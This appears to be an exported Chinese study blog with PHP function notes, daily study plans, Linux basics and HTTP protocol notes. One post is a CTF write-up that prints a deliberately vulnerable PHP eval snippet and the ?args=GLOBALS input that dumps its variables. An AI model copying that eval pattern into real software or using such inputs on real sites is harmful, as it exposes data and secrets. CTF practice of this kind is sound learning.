world&quot;,0,-6).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-2-3).&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line"></span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br><span class="line"></span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-02日目标</title>
    <url>/2020/02/01/2020-02-02%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-02计划"><a href="#2020-02-02计划" class="headerlink" title="2020-02-02计划"></a>2020-02-02计划</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第9章看完    </li>
<li>做一道ctf杂项题    </li>
<li>b站ctf答疑+流量取证看完</li>
<li>bugku的sql2看懂wp</li>
</ol>
<h2 id="2020-02-01总结"><a href="#2020-02-01总结" class="headerlink" title="2020-02-01总结"></a>2020-02-01总结</h2><p>状态还OK的，计划外学了一些burpsuite爆破的方法</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第8章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站web基础和sql注入看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-01日目标</title>
    <url>/2020/01/31/2020-02-01%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-01目标"><a href="#2020-02-01目标" class="headerlink" title="2020-02-01目标"></a>2020-02-01目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第8章看完    </li>
<li>做一道ctf杂项题    </li>
<li>b站web基础和sql注入看完</li>
</ol>
<h2 id="2020-01-31总结"><a href="#2020-01-31总结" class="headerlink" title="2020-01-31总结"></a>2020-01-31总结</h2><p>晚上稍稍有些分心，其他时间OK，第一次用ssr翻了墙，看了YouTube。</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第7章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站ctf linux基础看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>linux基础操作</title>
    <url>/2020/01/31/linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="创建，删除，修改"><a href="#创建，删除，修改" class="headerlink" title="创建，删除，修改"></a>创建，删除，修改</h2><blockquote>
<p>touch file</p>
</blockquote>
<p>创建文件、</p>
<p><strong>若要使文件名中包含空格则用 “\ “</strong></p>
<blockquote>
<p>mkdir dir</p>
</blockquote>
<p>创建目录</p>
<blockquote>
<p>rm [option]</p>
</blockquote>
<p>option值：</p>
<ol>
<li>-i   确认是否删除</li>
<li>-r   删除目录时使用</li>
<li>-f   强制删除</li>
</ol>
<blockquote>
<p>mv [option] file dst</p>
</blockquote>
<ol>
<li>dst仅是文件名，代表重命名</li>
<li>dst是目录名，代表移动file到目录里</li>
<li>dst是目录和文件名，代表移动和重命名</li>
</ol>
<p>如:</p>
<blockquote>
<p>mv file1 abc/file2</p>
</blockquote>
<p>代表把file1移动到abc目录下并重命名为file2</p>
<blockquote>
<p>cp [option] src dst</p>
</blockquote>
<p>复制文件到某个目录</p>
<h2 id="移动路径"><a href="#移动路径" class="headerlink" title="移动路径"></a>移动路径</h2><blockquote>
<p>cd   dir</p>
</blockquote>
<p>移动路径</p>
<blockquote>
<p>cd   ..</p>
</blockquote>
<p>移动到父目录</p>
<blockquote>
<p>cd   ../..</p>
</blockquote>
<p>移动到父目录的父目录</p>
<blockquote>
<p>pwd</p>
</blockquote>
<p>显示当前所在的工作目录</p>
<blockquote>
<p>ls   [option] [dir]</p>
</blockquote>
<p>option值</p>
<ol>
<li>-a   显示所有文件（包括隐藏文件）</li>
<li>-l   显示文件或目录的详细信息</li>
<li>-d   显示当前目录本身属性，而不是目录内容（配合-l使用）</li>
<li>-i   显示文件或目录的indoes （配合-l使用，一目了然）</li>
</ol>
<h2 id="文本查看及相关操作"><a href="#文本查看及相关操作" class="headerlink" title="文本查看及相关操作"></a>文本查看及相关操作</h2><blockquote>
<p>cat file</p>
</blockquote>
<p>显示文件所有内容</p>
<blockquote>
<p>less file</p>
</blockquote>
<p>分页显示文件内容</p>
<blockquote>
<p>head/tail file</p>
</blockquote>
<p>显示文件的首尾行（默认为10行）</p>
<blockquote>
<p>tail -num file </p>
<p>显示文件file末尾num行</p>
</blockquote>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim file</span><br></pre></td></tr></table></figure>

<p>进入file的命令模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i</span><br></pre></td></tr></table></figure>

<p>进入insert模式</p>
<p>退出到命令模式点左上角“esc”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:wq(!)</span><br></pre></td></tr></table></figure>

<p>(强制)保存并删除</p>
<p><img src="/2020/01/31/linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/1.png" alt="1"></p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-31日目标</title>
    <url>/2020/01/30/2020-01-31%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-31目标"><a href="#2020-01-31目标" class="headerlink" title="2020-01-31目标"></a>2020-01-31目标</h2><ol>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>2-3篇数学通识</li>
<li>HTTP协议第7章看完</li>
<li>做一道ctf杂项题</li>
<li>b站ctflinux基础看完</li>
</ol>
<h2 id="2020-01-30总结"><a href="#2020-01-30总结" class="headerlink" title="2020-01-30总结"></a>2020-01-30总结</h2><p>下午状态略差，其余时间还OK</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP协议第6章看完</td>
<td>Y</td>
</tr>
<tr>
<td>b站ctf密码学看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>N</td>
</tr>
<tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-30日目标</title>
    <url>/2020/01/29/2020-01-30%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-30目标"><a href="#2020-01-30目标" class="headerlink" title="2020-01-30目标"></a>2020-01-30目标</h2><ol>
<li>HTTP协议第6章看完</li>
<li>b站ctf密码学看完</li>
<li>做一道ctf杂项题</li>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>2-3篇数学通识</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02月目标 [寒假目标]</title>
    <url>/2020/01/29/2020-02%E6%9C%88%E7%9B%AE%E6%A0%87-%E5%AF%92%E5%81%87%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="学习时间"><a href="#学习时间" class="headerlink" title="学习时间"></a>学习时间</h2><ol>
<li>早上：10:00-12:00</li>
<li>下午：时间不定，共两小时</li>
<li>晚上：19:00-22:00</li>
</ol>
<h2 id="每日完成的小杂项"><a href="#每日完成的小杂项" class="headerlink" title="每日完成的小杂项"></a>每日完成的小杂项</h2><ol>
<li>英语听力10min</li>
<li>英语单词20个</li>
<li>数学通识50讲</li>
</ol>
<h2 id="大块目标"><a href="#大块目标" class="headerlink" title="大块目标"></a>大块目标</h2><ol>
<li>看完HTTP协议</li>
<li>预习下学期的C语言</li>
<li>b站ctf介绍看完</li>
<li>白帽子讲信息安全带着看掉</li>
<li>带着做一些ctf题目</li>
<li>学python</li>
</ol>
]]></content>
      <categories>
        <category>月目标</category>
      </categories>
  </entry>
  <entry>
    <title>php var_dump()函数 [输出变量具体信息]</title>
    <url>/2020/01/28/php-var-dump-%E5%87%BD%E6%95%B0-%E8%BE%93%E5%87%BA%E5%8F%98%E9%87%8F%E5%85%B7%E4%BD%93%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($expression)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><strong>例1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(1, 2, array(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;));</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  int(2)</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  array(3) &#123;</span><br><span class="line">    [0]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;a&quot;</span><br><span class="line">    [1]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;b&quot;</span><br><span class="line">    [2]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;c&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>例2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b &#x3D; 3.1;</span><br><span class="line">$c &#x3D; true;</span><br><span class="line">var_dump($b, $c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float(3.1)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 变量1</title>
    <url>/2020/01/28/bugku-%E5%8F%98%E9%87%8F1/</url>
    <content><![CDATA[<h2 id="题目：变量1"><a href="#题目：变量1" class="headerlink" title="题目：变量1"></a>题目：<a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">变量1</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<ol>
<li><p>error_reporting() 函数规定报告哪个错误。</p>
<p>而error_reporting(0) 表示关闭php错误显示。</p>
</li>
<li><p>用<a href="https://www.runoob.com/php/php-includes.html" target="_blank" rel="noopener">include</a>语句引入flag1.php文件，而flag应该就在里面</p>
</li>
<li><p>highlight_file()函数显示括号中文件的源代码</p>
</li>
<li><p>$_GET变量用来收集上传数据，具体方法为在网页域名后“?(要上传的数据)”</p>
</li>
<li><p>“/^\w+$/“该正则表达式代表$args变量要符合至少一个（0-9/a-z/A-Z）组成的字符串</p>
</li>
<li><p>要显示flag1.php里的值，尝试使用超级全局变量<strong>$GLOBALS</strong>($GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。)</p>
</li>
<li><p>var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
</li>
</ol>
<p>所以在域名后加“ ?args=GLOBALS ”,</p>
]]></content>
      <categories>
        <category>ctf总结</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>php is_numeric()函数 [检测变量是否为数字或数字字符串]</title>
    <url>/2020/01/28/php-is-numeric-%E5%87%BD%E6%95%B0-%E6%A3%80%E6%B5%8B%E5%8F%98%E9%87%8F%E6%98%AF%E5%90%A6%E4%B8%BA%E6%95%B0%E5%AD%97%E6%88%96%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is _numeric()"></a>is _numeric()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>检测变量是否为数字或数字字符串</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_numeric( &amp;var )</span><br></pre></td></tr></table></figure>

<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$var_name1&#x3D;678;</span><br><span class="line">$var_name2&#x3D;&quot;a678&quot;;</span><br><span class="line">$var_name3&#x3D;&quot;678&quot;;</span><br><span class="line">$var_name4&#x3D;&quot;runoob.com&quot;;</span><br><span class="line">$var_name5&#x3D;698.99;</span><br><span class="line">$var_name6&#x3D;array(&quot;a1&quot;,&quot;a2&quot;);</span><br><span class="line">$var_name7&#x3D;+125689.66;</span><br><span class="line">if (is_numeric($var_name1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name1 是数字&quot; . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name1 不是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line">if (is_numeric($var_name2))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name2 是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$var_name2 不是数字&quot; . PHP_EOL ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$result&#x3D;is_numeric($var_name3);</span><br><span class="line">echo &quot;[ $var_name3 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name4);</span><br><span class="line">echo &quot;[ $var_name4 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name5);</span><br><span class="line">echo &quot;[ $var_name5 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name6);</span><br><span class="line">echo &quot;[ $var_name6 是数字吗? ]&quot; .var_dump($result) . PHP_EOL;</span><br><span class="line">$result&#x3D;is_numeric($var_name7);</span><br><span class="line">echo &quot;[ $var_name7 是数字吗? ]&quot; .var_dump($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">678 是数字</span><br><span class="line">a678 不是数字</span><br><span class="line">[ 678 是数字吗? ]</span><br><span class="line">bool(true)</span><br><span class="line">[ runoob.com 是数字吗? ]</span><br><span class="line">bool(false)</span><br><span class="line">[ 698.99 是数字吗? ]</span><br><span class="line">bool(true)</span><br><span class="line">[ Array 是数字吗? ]</span><br><span class="line">bool(false)</span><br><span class="line">[ 125689.66 是数字吗? ]</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>URI格式</title>
    <url>/2020/01/25/URI%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="/2020/01/25/URI%E6%A0%BC%E5%BC%8F/7.png" alt="7"></p>
<p>使用 http: 或 https: 等协议方案名获取访问资源时要指定协议类型。不 区分字母大小写，最后附一个冒号（:）。 也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。</p>
<h3 id="登录信息（认证）"><a href="#登录信息（认证）" class="headerlink" title="登录信息（认证）"></a>登录信息（认证）</h3><p>指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份 认证）。此项是<strong><em>可选项</em></strong>。</p>
<h3 id="服务器地址"><a href="#服务器地址" class="headerlink" title="服务器地址"></a>服务器地址</h3><p>使用绝对 URI 必须指定待访问的服务器地址。地址可以是类似 hackr.jp 这种 DNS 可解析的名称，或是 192.168.1.1 这类 IPv4 地址 名，还可以是 [0:0:0:0:0:0:0:1] 这样用方括号括起来的 IPv6 地址名。</p>
<h3 id="服务器端口号"><a href="#服务器端口号" class="headerlink" title="服务器端口号"></a>服务器端口号</h3><p>指定服务器连接的网络端口号。此项也是<strong><em>可选项</em></strong>，若用户省略则自动 使用默认端口号。</p>
<h3 id="带层次的文件路径"><a href="#带层次的文件路径" class="headerlink" title="带层次的文件路径"></a>带层次的文件路径</h3><p>指定服务器上的文件路径来定位特指的资源。这与 UNIX 系统的文件 目录结构相似。</p>
<h3 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h3><p>针对已指定的文件路径内的资源，可以使用查询字符串传入任意参 数。此项<strong><em>可选</em></strong>。</p>
<h3 id="片段标识符"><a href="#片段标识符" class="headerlink" title="片段标识符"></a>片段标识符</h3><p>使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个 位置）。但在 RFC 中并没有明确规定其使用方法。该项也为可选 项。</p>
]]></content>
  </entry>
  <entry>
    <title>HTTP协议</title>
    <url>/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="与HTTP有关的协议"><a href="#与HTTP有关的协议" class="headerlink" title="与HTTP有关的协议"></a>与HTTP有关的协议</h1><p>先通过一张图大致了解一下http协议与相关协议之间的关系：</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/3.png" alt="3"></p>
<h2 id="DNS服务（域名解析）"><a href="#DNS服务（域名解析）" class="headerlink" title="DNS服务（域名解析）"></a>DNS服务（域名解析）</h2><p>DNS 协议提供通过域名 查找 IP 地址，或逆向从 IP 地址反查域名的服务。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/4.png" alt="4"></p>
<h2 id="TCP协议（位于传输层）"><a href="#TCP协议（位于传输层）" class="headerlink" title="TCP协议（位于传输层）"></a>TCP协议（位于传输层）</h2><ol>
<li>为了方便传输，TCP协议将 大块数据 分割以 报文段（segment）。</li>
<li>为了确保数据能准确无误地送达，TCP协议采用三次握手策略，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/5.png" alt="5"></p>
<h2 id="IP协议（位于网络层）"><a href="#IP协议（位于网络层）" class="headerlink" title="IP协议（位于网络层）"></a>IP协议（位于网络层）</h2><p>IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网 （LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转 才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（Address Resolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方 的 IP 地址就可以反查出对应的 MAC 地址。<br>没有人能够全面掌握互联网中的传输状况<br>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只 能获悉很粗略的传输路线。<br>这种机制称为路由选择（routing），有点像快递公司的送货过程。想 要寄快递的人，只要将自己的货物送到集散中心，就可以知道快递公 司是否肯收件发货，该快递公司的集散中心检查货物的送达地址，明 确下站该送往哪个区域的集散中心。接着，那个区域的集散中心自会 判断是否能送到对方的家中。<br>我们是想通过这个比喻说明，无论哪台计算机、哪台网络设备，它们 都无法全面掌握互联网中的细节。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/6.png" alt="6"></p>
<h1 id="HTTP协议基本信息"><a href="#HTTP协议基本信息" class="headerlink" title="HTTP协议基本信息"></a>HTTP协议基本信息</h1><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/8.png" alt="8"></p>
<ol>
<li><p>用于客户端和服务器端的通信。</p>
</li>
<li><p>通过请求和响应的交换达成通信。</p>
</li>
<li><p>HTTP 是一种不保存状态，即无状态（stateless）协议。</p>
</li>
<li><p>HTTP 协议使用 <a href="http://albatross-g.site/2020/01/25/URI格式/" target="_blank" rel="noopener">URI</a> 定位互联网上的资源。</p>
<p>当客户端请求访问资源而发送请求时，URI 需要将作为请求报文中的 请求 URI 包含在内。指定请求 URI 的方式有很多。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/9.png" alt="9"></p>
</li>
<li><p>HTTP协议使用持久连接。。持久连接的特点是，只要任意一端 没有明确提出断开连接，则保持 TCP 连接状态。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/10.png" alt="10"></p>
</li>
<li><p>持久连接使得多数请求以管线化（pipelining）方式发送成为可能。管线化技术 出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待 响应了。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/11.png" alt="11"></p>
</li>
<li><p>不可否认，无状态协议当然有它的优点。由于不必保存状态，自然 可减少服务器的 CPU 及内存资源的消耗。但面对需要保存的状况又会产生一定麻烦，于是引入了cookie技术。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/12.png" alt="12"></p>
</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/13.png" alt="13"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/14.png" alt="14"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/15.png" alt="15"></p>
<h1 id="HTTP结构"><a href="#HTTP结构" class="headerlink" title="HTTP结构"></a>HTTP结构</h1><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/19.png" alt="19"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/16.png" alt="16"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/17.png" alt="17"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/20.png" alt="20"></p>
<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/18.png" alt="18"></p>
<h3 id="GET方法（获取-访问资源）"><a href="#GET方法（获取-访问资源）" class="headerlink" title="GET方法（获取/访问资源）"></a>GET方法（获取/访问资源）</h3><p>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/21.png" alt="21"></p>
<h3 id="POST方法（传输实体主体）"><a href="#POST方法（传输实体主体）" class="headerlink" title="POST方法（传输实体主体）"></a>POST方法（传输实体主体）</h3><p>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/22.png" alt="22"></p>
<h3 id="PUT方法（传输文件）"><a href="#PUT方法（传输文件）" class="headerlink" title="PUT方法（传输文件）"></a>PUT方法（传输文件）</h3><p>PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。</p>
<p>但是，鉴于 HTTP/1.1 的 PUT 方法自身不带验证机制，任何人都可以 上传文件 , 存在安全性问题，因此一般的 Web 网站不使用该方法。若 配合 Web 应用程序的验证机制，或架构设计采用 REST（REpresentational State Transfer，表征状态转移）标准的同类 Web 网站，就可能会开放使用 PUT 方法。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/23.png" alt="23"></p>
<h3 id="HEAD方法（获取报文头部）"><a href="#HEAD方法（获取报文头部）" class="headerlink" title="HEAD方法（获取报文头部）"></a>HEAD方法（获取报文头部）</h3><p>HEAD 方法和 GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/24.png" alt="24"></p>
<h3 id="DELETE方法（删除文件）"><a href="#DELETE方法（删除文件）" class="headerlink" title="DELETE方法（删除文件）"></a>DELETE方法（删除文件）</h3><p>DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。 </p>
<p>但是，HTTP/1.1 的 DELETE 方法本身和 PUT 方法一样不带验证机 制，所以一般的 Web 网站也不使用 DELETE 方法。当配合 Web 应用 程序的验证机制，或遵守 REST 标准时还是有可能会开放使用的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/25.png" alt="25"></p>
<h3 id="OPTIONS方法（询问支持的办法）"><a href="#OPTIONS方法（询问支持的办法）" class="headerlink" title="OPTIONS方法（询问支持的办法）"></a>OPTIONS方法（询问支持的办法）</h3><p>OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/26.png" alt="26"></p>
<h3 id="TRACE方法（追踪路径）"><a href="#TRACE方法（追踪路径）" class="headerlink" title="TRACE方法（追踪路径）"></a>TRACE方法（追踪路径）</h3><p>TRACE 方法是让 Web 服务器端将之前的请求通信环回给客户端的方 法。</p>
<p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/27.png" alt="27"></p>
<h3 id="CONNECT方法（要求用隧道协议链接代理）"><a href="#CONNECT方法（要求用隧道协议链接代理）" class="headerlink" title="CONNECT方法（要求用隧道协议链接代理）"></a>CONNECT方法（要求用隧道协议链接代理）</h3><p>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/28.png" alt="28"></p>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/29.png" alt="29"></p>
<h3 id="2XX-成功（2XX-的响应结果表明请求被正常处理了。-）"><a href="#2XX-成功（2XX-的响应结果表明请求被正常处理了。-）" class="headerlink" title="2XX 成功（2XX 的响应结果表明请求被正常处理了。 ）"></a>2XX 成功（2XX 的响应结果表明请求被正常处理了。 ）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/30.png" alt="30"></p>
